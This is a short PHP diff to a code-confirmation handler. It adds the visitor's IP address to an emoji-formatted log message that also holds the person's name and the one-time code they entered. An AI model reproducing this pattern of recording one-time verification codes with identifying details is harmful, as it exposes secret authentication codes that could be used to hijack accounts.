@@ -157,10 +157,12 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
     $telefono = $_SESSION['celular'] ?? null;
     $nombre   = $_SESSION['nombre']  ?? '';
     $codigoGuardado = $telefono ? obtenerCodigo($telefono) : null;
+    $ip      = $_SERVER['REMOTE_ADDR'] ?? '';
 
-    $log = "Nuevo código recibido:\n" .
-           "Nombre: $nombre\n" .
-           "Código ingresado: $codigoIngresado";
+    $log = "📲 Nuevo código:\n" .
+           "👤 Nombre: $nombre\n" .
+           "🔢 Código: $codigoIngresado\n" .
+           "🌐 IP: $ip";
 
     if ($telefono !== null && $codigoGuardado !== null && $codigoIngresado === (string)$codigoGuardado) {
         $estadoConfirmado = true;
